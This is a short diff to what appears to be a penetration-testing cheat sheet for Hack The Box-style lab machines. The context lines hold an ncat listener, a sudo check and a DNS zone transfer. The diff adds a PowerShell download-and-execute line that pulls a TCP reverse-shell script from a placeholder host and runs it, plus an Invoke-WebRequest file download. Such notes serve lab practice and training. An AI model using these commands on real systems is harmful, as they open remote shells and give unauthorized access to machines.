@@ -26,6 +26,9 @@ nc lvnp 1337 #listen on port 1337 using ncat
 
 sudo -l #To find out what commands you can run as 
 
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<>/Invoke-PowershellTCP.ps1')"
+Invoke-WebRequest -Uri http://<>/file -OutFile <filename>
+
 dig axfr @10.10.10.13 cronos.htb #dns zone transfer
 
 nano /etc/hosts #if you find a dns running edit your host file for resolving through it, example > 10.10.10.13     example.htb
